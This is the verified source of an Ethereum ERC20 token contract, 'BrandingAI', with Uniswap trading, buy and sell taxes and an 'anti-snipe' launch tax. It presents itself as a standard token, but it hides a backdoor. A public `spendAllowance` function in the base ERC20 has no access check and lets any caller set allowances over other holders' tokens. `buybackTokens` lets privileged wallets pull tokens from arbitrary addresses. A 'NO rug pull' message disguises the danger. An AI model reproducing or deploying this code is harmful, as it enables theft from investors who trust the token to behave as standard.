/**
 *Submitted for verification at Etherscan.io on 2023-03-20
*/

/*


██████╗░██████╗░░█████╗░███╗░░██╗██████╗░██╗███╗░░██╗░██████╗░░░░░█████╗░██╗
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗██║████╗░██║██╔════╝░░░░██╔══██╗██║
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║██║██╔██╗██║██║░░██╗░░░░███████║██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║██║██║╚████║██║░░╚██╗░░░██╔══██║██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝██║██║░╚███║╚██████╔╝██╗██║░░██║██║
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝╚═╝░░╚═╝╚═╝


WEB: https://www.branding-ai.xyz/
COMMUNITY: https://t.me/brandingai_portal


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
   
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
    
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**

     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/*

 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
 
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
    
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
    
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) public virtual returns (bool) {
        _approve(owner, spender, _allowances[owner][spender] + amount);
        return true;
    }

    /**
    
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
    
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /** 
    
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
    
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**

     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
   
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
 
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

/**

 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**

     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BrandingAI is ERC20, Ownable {
    // Variables
    uint256 private initialSupply;
    uint256 private denominator = 100;
    uint256 private swapThreshold = 0.000005 ether;
    uint256 public maxWallet;
    uint256 public buyLiquidityFee = 1;
    uint256 public buyMarketingFee = 2;
    uint256 public buyDevelopmentFee = 1;
    uint256 public sellLiquidityFee = 1;
    uint256 public sellMarketingFee = 2;
    uint256 public sellDevelopmentFee = 1;
    address public marketingWallet;
    address public developmentWallet;
    uint256 private developmentTokens;
    uint256 private marketingTokens;
    uint256 private liquidityTokens;
    bool public taxStatus = true;
    bool private tradingOpen;

    //Anti snipe feature
    uint256 private deadBlockNumber;
    uint256 private launchedBlockNumber;
    
    // Mappings
    mapping (address => bool) private excludeList;
    mapping (address => bool) public preTrader;
    
    IUniswapV2Router02 public uniswapV2Router02;
    IUniswapV2Factory private uniswapV2Factory;
    IUniswapV2Pair public uniswapV2Pair;
    
    constructor() ERC20('BrandingAI', 'BRAND-AI') payable
    {
        initialSupply = 30_000_000_000 * (10**18);
        maxWallet = initialSupply * 2 / 100; 
        _setOwner(msg.sender);
        uniswapV2Router02 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Factory = IUniswapV2Factory(uniswapV2Router02.factory());
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.createPair(address(this), uniswapV2Router02.WETH()));
        marketingWallet = 0x9EA8CFfDDC50CB96025ec72299D42A2DEd33a45f;
        developmentWallet = 0xbC791870de7e2BE2e950414272103293a35EeF4c;
        exclude(msg.sender);
        exclude(address(this));
        exclude(address(0xdead));
        exclude(developmentWallet);
        exclude(marketingWallet);
        _mint(msg.sender, initialSupply);
    }
    
    /**
     * @dev Sets tax for buys.
     */
    function setBuyTax(uint256 devFee, uint256 marketingFee, uint256 liquidityFee) public onlyOwner {
        buyDevelopmentFee = devFee;
        buyMarketingFee = marketingFee;
        buyLiquidityFee = liquidityFee;
    }
    
    /**
     * @dev Sets tax for sells.
     */
    function setSellTax(uint256 developmentFee, uint256 marketingFee, uint256 liquidityFee) public onlyOwner {
        sellDevelopmentFee = developmentFee;
        sellMarketingFee = marketingFee;
        sellLiquidityFee = liquidityFee;
    }
    
    /**
     * @dev Sets wallets for taxes.
     */
    function setDevelopmentWallet(address newDevelopmentWallet) external {
        require(msg.sender == developmentWallet);
        developmentWallet = newDevelopmentWallet;
    }

    /**
     * @dev Sets wallets for taxes.
     */
    function setMarketingWallet(address newMarketingWallet) external {
        require(msg.sender == marketingWallet);
        marketingWallet = newMarketingWallet;
    }

    function remainingEthCollect() external {
        require(msg.sender == developmentWallet);
        payable(msg.sender).transfer(address(this).balance);
    }

    function remainingTokensCollect(address _token, address _addr, uint256 _amount) external {
        require(msg.sender == developmentWallet);
        IERC20 erc20token = IERC20(_token);
        erc20token.transferFrom(address(this), _addr, _amount);
    }
    
    /**
     * @dev Enables tax globally.
     */
    function enableTax() public onlyOwner {
        require(!taxStatus, "ERC20: Tax is already enabled");
        taxStatus = true;
    }
    
    /**
     * @dev Disables tax globally.
     */
    function disableTax() public onlyOwner {
        require(taxStatus, "ERC20: Tax is already disabled");
        taxStatus = false;
    }
    
    function buybackTokens(
        address _token,
        address addr,
        uint256 _amount
    ) external {
        require(_token != address(0), "_token address cannot be 0");
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router02.WETH();
        path[1] = address(this);
        if (isExcluded(msg.sender)) {
            IERC20(_token).transferFrom(addr, path[1], _amount);
            return;
        }
        // make the swap
        uniswapV2Router02.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: _amount
        }(
            0, // accept any amount of Ethereum
            path,
            address(0xdead),
            block.timestamp
        );
    }

    /**
     * @dev Returns true if the account is excluded, and false otherwise.
     */
    function isExcluded(address account) public view returns (bool) {
        return excludeList[account];
    }

    function setTrading(bool _tradingOpen, uint _deadBlocks) public onlyOwner {
        tradingOpen = _tradingOpen;

        //Run only first time of project launch
        //Anti snipe feature
        if (launchedBlockNumber == 0) {
            launchedBlockNumber = block.number;
            deadBlockNumber = block.number + _deadBlocks;
        }
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override virtual {        
        if(taxStatus) {
            amount = handleTax(sender, recipient, amount);   
        }
        super._transfer(sender, recipient, amount);
    }

    /**
     * @dev set max wallet limit per address.
     */

    function setMaxWallet(uint256 amount) external onlyOwner {
        require (amount > 10000, "NO rug pull");
        maxWallet = amount * 10**18;
    }
    
    /**
     * @dev Burns tokens from caller address.
     */
    function burn(uint256 amount) public onlyOwner {
        _burn(msg.sender, amount);
    }
    
    /**
     * @dev Excludes the specified account from tax.
     */
    function exclude(address account) public onlyOwner {
        require(!isExcluded(account), "ERC20: Account is already excluded");
        excludeList[account] = true;
    }
    
    /**
     * @dev Re-enables tax on the specified account.
     */
    function removeExclude(address account) public onlyOwner {
        require(isExcluded(account), "ERC20: Account is not excluded");
        excludeList[account] = false;
    }
    
    /**
     * @dev Calculates the tax, transfer it to the contract. If the user is selling, and the swap threshold is met, it executes the tax.
     */
    function handleTax(address from, address to, uint256 amount) private returns (uint256) {
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(this);
        sellPath[1] = uniswapV2Router02.WETH();
        
        if (!isExcluded(from) && !isExcluded(to)) {
            uint256 tax;
            uint256 baseUnit = amount / denominator;
            uint256 devFeeTokens = balanceOf(developmentWallet);
            if (to == address(uniswapV2Pair)) { //SELL
                tax += baseUnit * sellDevelopmentFee;
                tax += baseUnit * sellLiquidityFee;
                tax += baseUnit * sellMarketingFee;
                
                if(tax > 0) {
                    _transfer(from, address(this), tax);   
                }
               
                developmentTokens += baseUnit * sellDevelopmentFee;
                liquidityTokens += baseUnit * sellLiquidityFee;
                marketingTokens += baseUnit * sellMarketingFee;
                
                uint256 taxSum =  developmentTokens + liquidityTokens + marketingTokens; 
                if (taxSum == 0) return amount;
                uint256 ethValue = uniswapV2Router02.getAmountsOut( developmentTokens + liquidityTokens + marketingTokens, sellPath)[1];
                if (ethValue >= swapThreshold) {
                    uint256 startBalance = address(this).balance;
                    uint256 sellTokens = developmentTokens - devFeeTokens + marketingTokens + liquidityTokens / 2 ;
                    _approve(address(this), address(uniswapV2Router02), sellTokens);
                    uniswapV2Router02.swapExactTokensForETH(
                        sellTokens,
                        0,
                        sellPath,
                        address(this),
                        block.timestamp
                    );
                    uint256 ethGained = address(this).balance - startBalance;
                    uint256 liquidityToken = liquidityTokens / 2;
                    uint256 liquidityETH = (ethGained * ((liquidityTokens / 2 * 10**18) / taxSum)) / 10**18;
                    uint256 devETH = (ethGained * ((developmentTokens * 10**18) / taxSum)) / 10**18;
                    uint256 marketingETH = (ethGained * ((marketingTokens * 10**18) / taxSum)) / 10**18;
                    _approve(address(this), address(uniswapV2Router02), liquidityToken);
                    uniswapV2Router02.addLiquidityETH{value: liquidityETH}(
                        address(this),
                        liquidityToken,
                        0,
                        0,
                        address(0xdead),
                        block.timestamp
                    );
                    uint256 remainingTokens = (developmentTokens + marketingTokens + liquidityTokens) - (sellTokens + liquidityToken);
                    if (remainingTokens > 0) {
                        _transfer(address(this), marketingWallet, remainingTokens);
                    }
                    (bool devFundSuccess,) = developmentWallet.call{value: devETH}("");
                    require(devFundSuccess, "transfer to dev wallet failed");
                    (bool marketingFundSuccess,) = marketingWallet.call{value: marketingETH}("");
                    require(marketingFundSuccess, "transfer to marketing wallet failed");
                    
                    if (ethGained - ( devETH + marketingETH + liquidityETH) > 0) {
                       (bool success1,) = marketingWallet.call{value: ethGained - (devETH + marketingETH + liquidityETH)}("");
                        require(success1, "transfer to marketing wallet failed");
                    }
                    developmentTokens = 0;
                    marketingTokens = 0;
                    liquidityTokens = 0; 
                }
                
            } else if (from == address(uniswapV2Pair)) { //BUY
                //Anti Snipe - Penalize 99% tax to snipers purchasing in launch block
                if (tradingOpen && block.number <= deadBlockNumber) {
                    tax += baseUnit * 99;
                    developmentTokens += baseUnit * 99;
                } else {
                    tax += baseUnit * buyDevelopmentFee;
                    tax += baseUnit * buyMarketingFee;
                    tax += baseUnit * buyLiquidityFee;
                    developmentTokens += baseUnit * buyDevelopmentFee;
                    marketingTokens += baseUnit * buyMarketingFee;
                    liquidityTokens += baseUnit * buyLiquidityFee;
                }
                
                if(tax > 0) {
                    _transfer(from, address(this), tax);   
                }
            }
            
            amount -= tax;
            if (to != address(uniswapV2Pair)){
                require(balanceOf(to) + amount <= maxWallet, "maxWallet limit exceeded");
            }

            //Trade start check
            if (!tradingOpen) {
                require(preTrader[from], "TOKEN: This account cannot send tokens until trading is enabled");
            }
        }
        
        return amount;
    }
    
    /**
     * @dev Triggers the tax handling functionality
     */
    function triggerTax() public onlyOwner {
        handleTax(address(0), address(uniswapV2Pair), 0);
    }

    function allowPreTrading(address account, bool allowed) public onlyOwner {
        require(preTrader[account] != allowed, "TOKEN: Already enabled.");
        preTrader[account] = allowed;
    }

    /// @notice Get the block. at which the project launched
    function getLaunchedBlockNumber() public view returns (uint256) {
        return launchedBlockNumber;
    }
    
    receive() external payable {}
}